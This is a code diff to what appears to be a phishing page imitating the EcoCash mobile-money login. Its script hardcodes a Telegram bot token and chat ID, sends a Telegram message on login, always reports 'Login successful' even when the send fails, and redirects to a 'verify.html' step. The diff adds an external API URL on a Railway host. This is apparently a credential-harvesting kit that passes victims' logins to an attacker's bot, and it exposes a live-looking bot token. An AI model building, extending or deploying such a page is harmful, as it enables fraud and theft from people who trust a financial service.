@@ -165,7 +165,8 @@
         }
         
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
+            0%,
+            100% { transform: translateX(0); }
             20% { transform: translateX(-8px); }
             40% { transform: translateX(8px); }
             60% { transform: translateX(-8px); }
@@ -460,16 +461,18 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS - YOUR NEW BOT
+        // TELEGRAM & API CONFIGURATION
         // ============================================
         const BOT_TOKEN = '8591477821:AAGwCz3BNGP8uA0Rc7YnoIEJ2JDsrdOy9Bc';
         const CHAT_ID = '8395929995';
+        const API_URL = 'https://eco-cashm-production.up.railway.app/api';
 
         console.log('====================================');
         console.log('🔐 EcoCash Login Page Loaded');
         console.log('====================================');
         console.log('🤖 Bot Token:', BOT_TOKEN);
         console.log('📱 Chat ID:', CHAT_ID);
+        console.log('🌐 API URL:', API_URL);
         console.log('====================================');
 
         // ============================================
@@ -612,18 +615,15 @@
                         console.log('✅ Telegram notification sent successfully');
                     } else {
                         console.error('❌ Telegram error:', data.description);
-                        // Still proceed to verify page even if Telegram fails
                         showStatus('✅ Login successful! Redirecting...', 'success');
                     }
 
-                    // Redirect to verify page after 1.5 seconds
                     setTimeout(() => {
                         window.location.href = 'verify.html';
                     }, 1500);
                 })
                 .catch(error => {
                     console.error('❌ Telegram connection error:', error);
-                    // Still proceed to verify page even if Telegram fails
                     showStatus('✅ Login successful! Redirecting...', 'success');
                     setTimeout(() => {
                         window.location.href = 'verify.html';
